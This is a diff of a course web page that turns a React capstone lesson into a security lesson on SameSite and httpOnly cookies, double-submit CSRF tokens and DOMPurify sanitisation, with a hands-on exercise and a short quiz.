+              session cookie attached at all, and the server would see an unauthenticated request.
+              <code>SameSite=Lax</code> (the modern browser default) is slightly more permissive —
+              it still sends the cookie for top-level navigations (clicking a real link) but blocks
+              it on cross-site POSTs like the form above, which covers the CSRF case while not
+              breaking normal cross-site linking.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">the strongest setting, when your frontend and API share a site</div>
+              <pre><code>res.cookie('authToken', token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict', // never sent on any cross-site request, forged or not
+});
+</code></pre>
+            </div>
+
+            <p>
+              For extra defense-in-depth (or when <code>SameSite=Strict</code> is too restrictive
+              for a legitimate flow), the <strong>double-submit CSRF token</strong> pattern adds a
+              second, independent check: the server sends a random token the page can read, the
+              client echoes it back in a custom header on every mutation, and the server confirms the
+              header matches — something a cross-site form, which can't read your page's JavaScript
+              or cookies, has no way to forge.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">client -- read the CSRF token from a non-httpOnly cookie, echo it back on mutations</div>
+              <pre><code>function getCsrfToken(): string | undefined {
+  return document.cookie
+    .split('; ')
+    .find(row =&gt; row.startsWith('csrf_token='))
+    ?.split('=')[1];
+}
+
+async function transferFunds(to: string, amount: number) {
+  return fetch('/api/transfer', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-CSRF-Token': getCsrfToken() ?? '', // a forged cross-site request can't set this
+    },
+    body: JSON.stringify({ to, amount }),
+  });
+}
+</code></pre>
+            </div>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>Why the CSRF token cookie isn't httpOnly</strong>
+                <p>The double-submit pattern relies on your own page's JavaScript being able to read the token and echo it in a header — that's the entire proof that the request originated from your site, since a cross-origin attacker's script can't read cookies set for your domain. The <em>auth</em> cookie stays httpOnly; the CSRF token cookie is a separate, deliberately-readable value with no sensitive data in it.</p>
+              </div>
+            </div>
+          </section>
+
+          <section id="exercise">
+            <h2>6. Hands-on Exercise</h2>
             <div class="lesson-exercise">
               <span class="lesson-exercise__badge">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h7l-1 8 11-14h-7l1-6Z"/></svg>
-                Capstone
+                Hands-on
               </span>
-              <h3>Ship a complete, tested, deployed React application</h3>
-              <p>Pick a real, well-scoped problem — a small project tracker, a recipe collection with search and favorites, a personal expense log — and take it fully through Sections 1–5.</p>
+              <h3>Build a real RequireAuth/RequireRole pair, an httpOnly login flow, and a sanitized comment</h3>
+              <p>Turn this week's three security concerns into working code inside one small app.</p>
 
               <p><strong>Requirements:</strong></p>
               <ol>
-                <li>Write your project scope (Section 1) before writing any code: core flow, data needs, page count, and success criteria.</li>
-                <li>Justify your architecture in writing (Section 2): rendering strategy, server state, global state, and component structure choices.</li>
-                <li>Implement incrementally (Section 3), validating each layer — routes, reads, writes, shared state — before adding the next.</li>
-                <li>Complete a full testing, performance and accessibility pass (Section 4), fixing what it surfaces rather than just running the tools once.</li>
-                <li>Deploy the app for real and produce a portfolio write-up with a live link (Section 5).</li>
+                <li>Write a <code>RequireAuth</code> route wrapper (as in Week 7) plus a <code>RequireRole({'role'})</code> wrapper that accepts a role and redirects to <code>/forbidden</code> when the current user's role doesn't match — wire both into a route tree so <code>/admin</code> requires <em>both</em> being logged in and being an admin.</li>
+                <li>Write a <code>login()</code> function that POSTs credentials to <code>/api/login</code> with <code>credentials: 'include'</code> and never reads or stores a token in JS. If you don't have a real backend available, write the Express-style handler from Section 2 in a comment above your client code to show exactly what it would set.</li>
+                <li>Add a fake current-user hook (<code>useAuth</code>) backed by an <code>/api/me</code> call that relies purely on the cookie being attached automatically — no token passed manually anywhere in your client code.</li>
+                <li>Install DOMPurify and render one piece of "user-generated" rich-text content (hardcode a string containing a <code>&lt;script&gt;</code> tag to prove it gets stripped) through a sanitized <code>dangerouslySetInnerHTML</code>, using an allowlist of tags.</li>
+                <li>Add a comment documenting which <code>SameSite</code> value your login cookie uses and why you chose it over the alternative.</li>
               </ol>
 
               <div class="callout callout--tip">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
                 <div>
-                  <strong>What makes a strong capstone</strong>
-                  <p>Not scope or cleverness — a small, well-built app with real tests, a real deploy, and a clear explanation of your architectural decisions reads as far more credible to anyone reviewing it (an employer, a collaborator, future-you) than an ambitious app with no evidence any of it actually works.</p>
+                  <strong>Hint</strong>
+                  <p>To confirm your token really isn't reachable from JS, open your browser's dev console on the running app and try <code>document.cookie</code> — an httpOnly cookie simply won't appear in that string, which is the whole point.</p>
                 </div>
               </div>
             </div>
           </section>
 
-          <section id="checklist">
-            <h2>7. Final Checklist</h2>
-            <p>Before calling the capstone — and the course — done, confirm each of these honestly:</p>
+          <section id="quiz">
+            <h2>7. Knowledge Check</h2>
+            <p>Four quick questions. Expand each to check your answer.</p>
+
             <div class="quiz-list">
               <details class="week-item quiz-item">
                 <summary>
-                  <span class="week-item__badge">✓</span>
+                  <span class="week-item__badge">Q1</span>
                   <div class="week-item__heading">
-                    <h4>Is the project scope written down, with concrete success criteria decided before you built the app?</h4>
+                    <h4>What's the core tradeoff between a server session (cookie + server-side store) and a JWT?</h4>
                   </div>
                   <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
                 </summary>
                 <div class="week-item__body week-item__body--single">
                   <div class="week-item__col">
-                    <p>If success criteria were defined after seeing what you built, they're no longer a fair test of it — the same discipline behind writing a Week 14 test's expectations before, not after, checking what the code currently does.</p>
+                    <p>A server session keeps state on the server, which makes revocation instant (delete the session row) but requires that state to be reachable by every server instance handling requests. A JWT is self-contained and stateless — any server holding the signing secret can verify it without a lookup, which scales easily, but there's no way to revoke a single token before it expires without adding extra machinery like a denylist.</p>
                   </div>
                 </div>
               </details>
 
               <details class="week-item quiz-item">
                 <summary>
-                  <span class="week-item__badge">✓</span>
+                  <span class="week-item__badge">Q2</span>
                   <div class="week-item__heading">
-                    <h4>Can you explain, for every major library or pattern you used, why it was necessary rather than just familiar?</h4>
+                    <h4>Why is storing an auth token in <code>localStorage</code> usually the wrong choice?</h4>
                   </div>
                   <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
                 </summary>
                 <div class="week-item__body week-item__body--single">
                   <div class="week-item__col">
-                    <p>Every added dependency and pattern is added complexity and surface area to maintain. A capstone that can justify each choice crisply — Zustand because this specific state changes often and is read widely, not "because it's popular" — reads as far more mature engineering judgment than one that used every tool from the course regardless of fit.</p>
+                    <p><code>localStorage</code> is fully readable by any JavaScript running on the page. If the app has even one XSS vulnerability — one unsanitized render, one compromised dependency — an attacker's injected script can read the token directly with <code>localStorage.getItem(...)</code> and send it to their own server, no cookie theft or network interception required. An httpOnly cookie removes this risk because JavaScript can't read it at all.</p>
                   </div>
                 </div>
               </details>
 
               <details class="week-item quiz-item">
                 <summary>
-                  <span class="week-item__badge">✓</span>
+                  <span class="week-item__badge">Q3</span>
                   <div class="week-item__heading">
-                    <h4>Does the app actually work end to end when a stranger opens the deployed link, on a real network, with no local setup?</h4>
+                    <h4>When is <code>dangerouslySetInnerHTML</code> actually necessary, and how do you use it safely?</h4>
                   </div>
                   <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
                 </summary>
                 <div class="week-item__body week-item__body--single">
                   <div class="week-item__col">
-                    <p>A capstone that only works on your own machine, with your own local environment, isn't actually finished — deployment (Section 5) is not optional polish tacked on at the end; it's the proof the application is real and the actual form in which anyone else will ever evaluate it.</p>
+                    <p>It's needed when content is legitimately meant to render as HTML rather than plain text — rich-text editor output, a CMS field, converted Markdown — cases where JSX's default text-escaping would be wrong, not just inconvenient. It's safe only when the HTML string is passed through a sanitizer like DOMPurify (with an explicit tag/attribute allowlist) immediately before rendering, every time, regardless of how "trusted" the source seems.</p>
                   </div>
                 </div>
               </details>
 
               <details class="week-item quiz-item">
                 <summary>
-                  <span class="week-item__badge">✓</span>
+                  <span class="week-item__badge">Q4</span>
                   <div class="week-item__heading">
-                    <h4>Could someone else — a hiring manager, a collaborator — understand what this does and how well it works, without reading your code?</h4>
+                    <h4>How does a <code>SameSite=Strict</code> cookie mitigate CSRF?</h4>
                   </div>
                   <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
                 </summary>
                 <div class="week-item__body week-item__body--single">
                   <div class="week-item__col">
-                    <p>A working app is only as valuable as your ability to communicate what it does and why it matters — the write-up from Section 5 is the actual deliverable a reader will judge the whole project by, exactly as it was for the LLM &amp; ML course's capstone. A live link plus a clear explanation beats a GitHub repo nobody without your context can evaluate.</p>
+                    <p>CSRF relies on the browser automatically attaching a session cookie to a request triggered by a form or script hosted on a completely different, malicious site. <code>SameSite=Strict</code> tells the browser to never send that cookie on any cross-site request, so the forged request arrives at the server with no session cookie attached at all — indistinguishable from an unauthenticated request, and rejected accordingly.</p>
                   </div>
                 </div>
               </details>
             </div>
-
-            <p style="margin-top:24px;">
-              That's the full 20-week path — from your first component to a tested, optimized,
-              deployed production React application. Congratulations on reaching the capstone.
-            </p>
           </section>
 
         </article>
@@ -389,11 +722,11 @@
         <div class="lesson-pager">
           <a href="week-24.html" class="lesson-pager__link lesson-pager__link--prev">
             <span class="lesson-pager__label">← Back to</span>
-            <span class="lesson-pager__title">Week 24: Micro-Frontends &amp; Advanced Architecture</span>
+            <span class="lesson-pager__title">Week 24: Animations &amp; Internationalization</span>
           </a>
-          <a href="../react/index.html#timeline" class="lesson-pager__link lesson-pager__link--next">
-            <span class="lesson-pager__label">Finished!</span>
-            <span class="lesson-pager__title">Back to Full Syllabus →</span>
+          <a href="week-26.html" class="lesson-pager__link lesson-pager__link--next">
+            <span class="lesson-pager__label">Up next</span>
+            <span class="lesson-pager__title">Week 26: Micro-Frontends &amp; Advanced Architecture →</span>
           </a>
         </div>
       </div>
@@ -419,6 +752,7 @@
       <a href="../system-design/index.html">System Design</a>
       <a href="../node-express/index.html">Node.js &amp; Express</a>
       <a href="../servicenow/index.html">ServiceNow</a>
+      <a href="../aptitude/index.html">Numerical Aptitude</a>
       <a href="#top">Back to top</a>
     </nav>
     <small>© 2026 CodeVerse Creatives. All rights reserved.</small>
